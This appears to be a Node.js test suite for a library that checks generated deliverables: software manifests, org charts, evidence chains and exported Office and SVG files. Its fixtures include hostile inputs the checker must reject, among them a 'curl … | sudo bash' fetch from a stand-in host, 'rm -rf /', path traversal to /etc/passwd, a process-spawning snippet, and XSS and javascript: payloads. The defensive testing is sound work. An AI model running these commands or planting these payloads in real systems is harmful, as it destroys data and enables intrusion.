'use strict';
// #17 M1–M3 unit-level checks of lib/delivery-check.js with synthetic fixtures.
// No network, no real vendor; the only code execution is the existing controlled
// executor, used when (and only when) it is available and explicitly requested.
const test = require('node:test');
const assert = require('node:assert/strict');
const { spawnSync } = require('node:child_process');
const DC = require('../lib/delivery-check');
const { createDeliverable } = require('../lib/deliverables');
const FX = require('./claude-delivery-fixtures.cjs');

function withExec(enabled) {
  const CX = require('../lib/code-exec');
  return { runJavaScript: CX.runJavaScript, codeExecStatus: () => ({ ...CX.codeExecStatus(), enabled }) };
}

test('M1 software manifest: classification, compile-only syntax, consistency; never executes without an explicit request', async () => {
  const out = FX.software(), m = DC.softwareManifest(out);
  assert.deepEqual(m.files.map(f => [f.path, f.type, f.syntax]), [['README.md', 'doc', 'not_checked'], ['package.json', 'config', 'ok'], ['src/ledger.js', 'source', 'ok'], ['test/ledger.test.js', 'test', 'ok']]);
  assert.ok(m.consistency.every(c => c.ok), JSON.stringify(m.consistency.filter(c => !c.ok)));
  assert.equal(m.status.structure, 'valid'); assert.equal(m.status.usable, 'not_run'); assert.equal(m.status.expertReview, 'not_run');
  let called = false;
  const spy = { codeExecStatus: () => ({ enabled: true, isolated: true }), runJavaScript: async () => { called = true; return { exitCode: 0, stdout: 'LEDGER SMOKE OK', stderr: '' }; } };
  const notRequested = await DC.runSoftwareSmoke(DC.softwareManifest(out), out, { exec: spy, requested: false });
  assert.equal(notRequested.status.usable, 'not_run'); assert.equal(called, false, 'no request => no execution');
  const disabled = await DC.runSoftwareSmoke(DC.softwareManifest(out), out, { exec: { ...spy, codeExecStatus: () => ({ enabled: false, isolated: true, reason: '管理员未开启' }) }, requested: true });
  assert.equal(disabled.status.usable, 'not_run'); assert.match(disabled.status.reason, /管理员未开启/); assert.equal(called, false);
});

test('M1 placeholders, traversal, absolute/duplicate paths, syntax errors and unsafe instructions are never "runnable"', async () => {
  const ph = DC.softwareManifest(FX.placeholderSoftware());
  assert.equal(ph.status.usable, 'mock_placeholder');
  const smoked = await DC.runSoftwareSmoke(ph, FX.placeholderSoftware(), { exec: { codeExecStatus: () => ({ enabled: true, isolated: true }), runJavaScript: async () => { throw new Error('must not run'); } }, requested: true });
  assert.equal(smoked.status.usable, 'mock_placeholder', 'placeholder code is never executed or upgraded');
  const evil = DC.softwareManifest({ files: [
    { path: '../../etc/passwd', content: 'x' }, { path: '/abs/file.js', content: 'x' }, { path: 'C:/win.js', content: 'x' }, { path: 'a/../b.js', content: 'x' },
    { path: 'ok.js', content: 'const = ;' }, { path: 'ok.js', content: 'dup' }, { path: 'con.txt', content: 'x' }, { path: 'bin.js', content: 7 } ],
    software: { install: 'curl https://evil.invalid/x.sh | sudo bash', run: 'rm -rf / && node ok.js' } });
  assert.deepEqual(evil.rejected.map(r => r.reason).sort(), ['absolute_path', 'illegal_characters', 'content_not_text', 'duplicate_path', 'path_traversal', 'path_traversal', 'reserved_name'].sort());
  assert.match(evil.files.find(f => f.path === 'ok.js').syntax, /^error/);
  assert.equal(evil.status.structure, 'invalid'); assert.equal(evil.status.usable, 'failed');
  assert.ok(evil.warnings.some(w => w.includes('下载后直接管道执行'))); assert.ok(evil.warnings.some(w => w.includes('递归删除')));
  assert.ok(evil.warnings.every(w => w.includes('平台从不执行')));
  // Export never packages traversal paths (existing deliverables guard).
  assert.throws(() => createDeliverable('zip', { files: [{ path: '../x', content: 'x' }] }), /不安全/);
});

const exec = require('../lib/code-exec').codeExecStatus();
test('M1 isolated sandbox smoke test: real runnable_verified only on a real pass; failing / command-spawning code fails', { skip: !exec.isolated && 'this host cannot create an isolated namespace (NOT_RUN, not PASS)' }, async t => {
  // The controlled executor reads the administrator switch itself; enable it only inside this test.
  const previous = process.env.AIJ_ENABLE_CODE_EXECUTION; process.env.AIJ_ENABLE_CODE_EXECUTION = '1';
  t.after(() => { if (previous === undefined) delete process.env.AIJ_ENABLE_CODE_EXECUTION; else process.env.AIJ_ENABLE_CODE_EXECUTION = previous; });
  const out = FX.software();
  const ok = await DC.runSoftwareSmoke(DC.softwareManifest(out), out, { exec: withExec(true), requested: true });
  t.diagnostic(JSON.stringify(ok.smoke));
  assert.equal(ok.status.usable, 'runnable_verified', JSON.stringify(ok.smoke)); assert.equal(ok.smoke.exitCode, 0); assert.match(ok.smoke.stdout, /LEDGER SMOKE OK/);
  const broken = FX.software(); broken.files[3].content = "require('node:assert').equal(1, 2);";
  const bad = await DC.runSoftwareSmoke(DC.softwareManifest(broken), broken, { exec: withExec(true), requested: true });
  assert.equal(bad.status.usable, 'failed'); assert.notEqual(bad.smoke.exitCode, 0);
  const spawner = FX.software(); spawner.files[3].content = "require('node:child_process').execSync('id'); console.log('LEDGER SMOKE OK');";
  const blocked = await DC.runSoftwareSmoke(DC.softwareManifest(spawner), spawner, { exec: withExec(true), requested: true });
  assert.equal(blocked.status.usable, 'failed', 'external commands are blocked by the permission model'); assert.match(blocked.smoke.stderr, /ERR_ACCESS_DENIED|permission/i);
  const network = FX.software(); network.files[3].content = "fetch('http://example.com').then(()=>console.log('LEDGER SMOKE OK'), e => { console.error('NET BLOCKED', e.cause?.code || e.message); process.exit(3); });";
  const net = await DC.runSoftwareSmoke(DC.softwareManifest(network), network, { exec: withExec(true), requested: true });
  assert.equal(net.status.usable, 'failed', 'no network inside the sandbox'); assert.equal(net.smoke.exitCode, 3);
});

test('M2 org chart: valid tree, safe static SVG, text tree; cycles, orphans, duplicates, self-parent, multi-root, illegal input', () => {
  const chart = DC.orgChart(FX.organization().orgChart);
  assert.equal(chart.valid, true, chart.errors.join()); assert.deepEqual(chart.roots, ['gm']); assert.equal(chart.depth, 3);
  assert.equal(chart.status.usable, 'graph_validated'); assert.equal(chart.status.expertReview, 'not_run');
  const svg = DC.orgChartSvg(chart).toString('utf8');
  assert.equal((svg.match(/data-node-id=/g) || []).length, 8); assert.equal((svg.match(/<path /g) || []).length, 7);
  assert.doesNotMatch(svg, /<script|on[a-z]+=|href=|foreignObject/i);
  // Layout matches the hierarchy: a parent is centred over its own children, and siblings' subtrees do not interleave.
  const x = id => Number(new RegExp(`data-node-id="${id}"><rect x="([\\d.]+)"`).exec(svg)[1]);
  assert.equal(x('ops'), (x('prod') + x('plan')) / 2); assert.equal(x('qa'), x('insp'));
  assert.ok(x('plan') < x('insp') && x('insp') < x('hr'), 'subtrees stay contiguous left-to-right');
  assert.match(DC.orgChartText(chart), /^- 总经理（总经理）[\s\S]*\n    - 生产主管/);
  const base = () => JSON.parse(JSON.stringify(FX.organization().orgChart));
  const cases = {
    cycle: o => { o.nodes[0].parentId = 'prod'; }, orphan: o => { o.nodes[3].parentId = 'ghost'; }, duplicate: o => { o.nodes[2].id = 'ops'; },
    self: o => { o.nodes[1].parentId = 'ops'; }, badId: o => { o.nodes[1].id = '../x'; }, proto: o => { o.nodes[1].id = '__proto__'; }, empty: o => { o.nodes = []; },
    notObject: o => { o.nodes.push('x'); }, tooMany: o => { o.nodes = Array.from({ length: 201 }, (_, i) => ({ id: 'n' + i, name: 'n', parentId: i ? 'n0' : undefined })); },
  };
  const results = {};
  for (const [name, mutate] of Object.entries(cases)) { const o = base(); mutate(o); const c = DC.orgChart(o); results[name] = c.errors[0]; assert.equal(c.valid, false, name); assert.throws(() => DC.orgChartSvg(c), /未通过校验/); }
  assert.match(results.cycle, /环/); assert.match(results.orphan, /孤点/); assert.match(results.duplicate, /重复ID/); assert.match(results.self, /环/);
  const multi = base(); multi.nodes[7].parentId = undefined;
  const m = DC.orgChart(multi); assert.equal(m.valid, true); assert.ok(m.warnings.some(w => /多个最高层/.test(w)));
  const xss = base(); xss.nodes[1].name = '<script>alert(1)</script>"&\''; xss.nodes[1].title = '<img src=x onerror=alert(1)>';
  const s = DC.orgChartSvg(DC.orgChart(xss)).toString('utf8');
  assert.doesNotMatch(s, /<script|<img|onerror=/); assert.match(s, /&lt;script&gt;/);
});

test('M3 evidence chain: synthetic vs unverified, model "verified" downgraded, gaps flagged, citations kept, bad links dropped', () => {
  const chain = DC.evidenceChain(FX.research());
  assert.equal(chain.valid, true, chain.errors.join());
  assert.deepEqual(chain.evidence.map(e => [e.id, e.verification, e.fetched]), [['E1', 'synthetic', false], ['E2', 'unverified', false], ['E3', 'unverified', false]]);
  assert.ok(chain.warnings.some(w => /E3：模型自称已核实/.test(w)));
  assert.deepEqual(chain.claims.map(c => [c.id, c.state]), [['C1', 'synthetic_only'], ['C2', 'unverified'], ['C3', 'unverified'], ['C4', 'unsupported']]);
  assert.ok(chain.claims.find(c => c.id === 'C3').alerts.some(a => /数字\/金额\/法规/.test(a)));
  assert.ok(chain.claims.find(c => c.id === 'C4').alerts.some(a => /缺证/.test(a)));
  assert.equal(chain.claims[0].citedText.endsWith('[E1]'), true);
  assert.equal(chain.summary.verified, 0); assert.equal(chain.status.usable, 'evidence_gaps');
  const complete = FX.research(); complete.claims.pop();
  assert.equal(DC.evidenceChain(complete).status.usable, 'evidence_mapped_unverified', 'never "verified" without a human check');
  const bad = FX.research(); bad.claims[0].evidenceIds = ['E9']; bad.evidence[1].url = 'javascript:alert(1)'; bad.evidence.push({ id: 'E1', kind: 'source' });
  const b = DC.evidenceChain(bad);
  assert.equal(b.valid, false); assert.ok(b.errors.some(e => /不存在的证据 E9/.test(e))); assert.ok(b.errors.some(e => /重复证据ID/.test(e)));
  assert.equal(b.evidence.find(e => e.id === 'E2').url, null); assert.ok(b.warnings.some(w => /不允许的链接协议/.test(w)));
  const rows = DC.evidenceRows(chain); assert.equal(rows.length, 5); assert.deepEqual(rows[4].slice(0, 4), ['C4', '适老化改造能显著提升满意度。', '无', 'unsupported']);
});

test('M2/M3 export linkage: real DOCX/XLSX/PPTX contain the verified org structure and evidence chain (independent python parse)', t => {
  const probe = spawnSync('python3', ['-c', 'import docx, openpyxl, pptx'], { encoding: 'utf8' });
  const files = {
    'org.docx': createDeliverable('docx', { ...DC.augmentExport('docx', FX.organization(), { orgSvg: { artifactId: 'art_x', filename: 'org-chart.svg', sha256: 'f'.repeat(64) } }), title: 'Org' }).buffer,
    'org.pptx': createDeliverable('pptx', { ...DC.augmentExport('pptx', FX.organization()), title: 'Org' }).buffer,
    'res.xlsx': createDeliverable('xlsx', { ...DC.augmentExport('xlsx', FX.research()), title: 'Res' }).buffer,
    'sw.docx': createDeliverable('docx', { ...DC.augmentExport('docx', FX.software()), title: 'SW' }).buffer,
  };
  for (const [k, b] of Object.entries(files)) assert.equal(DC.checkArtifact({ artifactId: k, filename: k, format: k.split('.').pop() }, b).structure, 'valid', k);
  // Integration (#23): under AIJ_RELEASE_VALIDATION=1 the #15 gate turns missing parsers into a BLOCKED failure.
  if (probe.status !== 0) require('../tools/p2/office-gate').requireParsed({ status: 'NOT_RUN' });
  if (probe.status !== 0) { t.diagnostic('NOT_RUN: python-docx/openpyxl/python-pptx missing'); t.skip('independent parsers unavailable (NOT_RUN)'); return; }
  const dir = require('node:fs').mkdtempSync(require('node:path').join(require('node:os').tmpdir(), 'aij-claude-delivery-'));
  t.after(() => require('node:fs').rmSync(dir, { recursive: true, force: true }));
  for (const [k, b] of Object.entries(files)) require('node:fs').writeFileSync(require('node:path').join(dir, k), b);
  const r = spawnSync('python3', ['-c', `import sys,json,docx,openpyxl,pptx
d=sys.argv[1]
o={'org':[p.text for p in docx.Document(d+'/org.docx').paragraphs],'sw':[p.text for p in docx.Document(d+'/sw.docx').paragraphs],
 'ppt':[sh.text_frame.text for s in pptx.Presentation(d+'/org.pptx').slides for sh in s.shapes if sh.has_text_frame],
 'xlsx':[[('' if c is None else str(c)) for c in row] for row in openpyxl.load_workbook(d+'/res.xlsx').active.iter_rows(values_only=True)]}
print(json.dumps(o,ensure_ascii=False))`, dir], { encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  const p = JSON.parse(r.stdout);
  assert.ok(p.org.includes('组织结构（已校验）')); assert.ok(p.org.some(x => x.includes('    - 生产主管'))); assert.ok(p.org.some(x => x.includes('org-chart.svg（artifactId art_x')));
  assert.ok(p.org.some(x => /领域专家评审未进行（NOT_RUN）/.test(x)));
  assert.ok(p.ppt.some(x => x.includes('组织结构')) && p.ppt.some(x => x.includes('组织优化摘要')), 'original slides kept + linked slide added');
  assert.deepEqual(p.xlsx[0], ['主张ID', '主张（含引用标注）', '证据', '证据核验状态', '假设', '提醒']); assert.equal(p.xlsx[4][3], 'unsupported');
  assert.ok(p.sw.some(x => x.includes('软件交付清单'))); assert.ok(p.sw.some(x => x.includes('平台不执行')));
});

test('M4 artifact structure checks: OOXML parts, ZIP path safety, SVG safety, mock markers, corrupt files', () => {
  const docx = createDeliverable('docx', { title: 't', text: 'x' }).buffer;
  assert.equal(DC.checkArtifact({ filename: 'a.docx', format: 'docx' }, docx).structure, 'valid');
  assert.equal(DC.checkArtifact({ filename: 'a.docx', format: 'docx' }, Buffer.from('not a zip')).structure, 'invalid');
  const zip = createDeliverable('zip', { files: [{ path: 'src/a.js', content: '// MOCK PLACEHOLDER' }] }).buffer;
  assert.equal(DC.checkArtifact({ filename: 'a.zip', format: 'zip' }, zip).usable, 'mock_placeholder');
  const evilSvg = Buffer.from('<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  assert.equal(DC.checkArtifact({ filename: 'x.svg', format: 'svg' }, evilSvg).structure, 'invalid');
  const ext = Buffer.from('<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.invalid/x.png"/></svg>');
  assert.equal(DC.checkArtifact({ filename: 'x.svg', format: 'svg' }, ext).structure, 'invalid');
  const s = DC.checkArtifact({ filename: 'a.docx', format: 'docx' }, docx);
  assert.equal(s.expertReview, 'not_run'); assert.equal(s.usable, 'structure_only'); assert.notEqual(s.usable, 'runnable_verified');
});
